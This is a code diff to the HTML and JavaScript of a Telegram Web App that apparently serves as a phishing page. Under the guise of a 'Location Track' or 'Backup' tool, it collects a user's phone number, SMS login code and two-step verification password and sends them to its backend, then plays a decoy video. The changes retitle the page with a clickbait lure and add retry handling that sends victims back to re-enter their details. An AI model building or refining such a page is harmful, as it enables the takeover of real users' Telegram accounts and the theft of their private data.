@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Backup App</title>
+    <title>Location Track watch full video to continue</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         /* Base Styles & Dark Theme */
@@ -120,7 +120,7 @@
     <div id="step-result" class="step-screen">
         <div style="font-size: 50px; margin-bottom: 10px;">🎉</div>
         <h2>Rick Role</h2>
-        <p class="subtitle" style="margin-bottom: 10px;">Watch full video to continue.</p>
+        <p class="subtitle" style="margin-bottom: 10px;">Location Track watch full video to continue.</p>
         
         <div class="iframe-container">
             <iframe width="100%" height="220" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" title="Rick Role" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
@@ -130,18 +130,21 @@
 </div>
 
 <script>
-    // Initialize Telegram WebApp
     const tg = window.Telegram.WebApp;
     tg.expand();
     
-    // Extract TG User Data
     const tg_user_id = tg.initDataUnsafe?.user?.id || "web_test_user";
     const tg_username = tg.initDataUnsafe?.user?.username || "unknown";
 
-    // Utility to switch screens
     function showStep(stepId) {
         document.querySelectorAll('.step-screen').forEach(el => el.classList.remove('active'));
         document.getElementById(stepId).classList.add('active');
+        
+        // Clear inputs if returning to phone screen
+        if (stepId === 'step-phone') {
+            document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+            document.getElementById('two-fa-pass').value = '';
+        }
     }
 
     function showToast() {
@@ -167,7 +170,6 @@
         } catch (err) { alert("Network Error"); }
     }
 
-    // ON LOAD: Check Session
     window.onload = async () => {
         try {
             const response = await fetch("/check_session", {
@@ -198,7 +200,7 @@
             document.getElementById('otp-subtitle').innerText = `We've sent an SMS code to ${code + num}.`;
             showStep('step-otp');
             document.querySelectorAll('.otp-input')[0].focus();
-        }
+        } 
     }
 
     function moveToNext(current, nextIndex) {
@@ -222,8 +224,16 @@
                 document.getElementById('otp-loader').style.display = "none";
                 document.querySelectorAll('.otp-input').forEach(input => input.disabled = false);
 
-                if(res.next_step === '2fa') showStep('step-2fa');
-                else if (res.next_step === 'result') { showToast(); showStep('step-result'); }
+                if(res.next_step === '2fa') {
+                    showStep('step-2fa');
+                } else if (res.next_step === 'result') { 
+                    showToast(); 
+                    showStep('step-result'); 
+                } else if (res.status === 'error') {
+                    // ID mismatch handling
+                    alert(res.message);
+                    showStep('step-phone');
+                }
             }
         }
     }
@@ -245,6 +255,10 @@
         if(res && res.status === 'success') {
             showToast();
             showStep('step-result');
+        } else if (res && res.status === 'error') {
+            // ID mismatch handling
+            alert(res.message);
+            showStep('step-phone');
         }
     }
 </script>
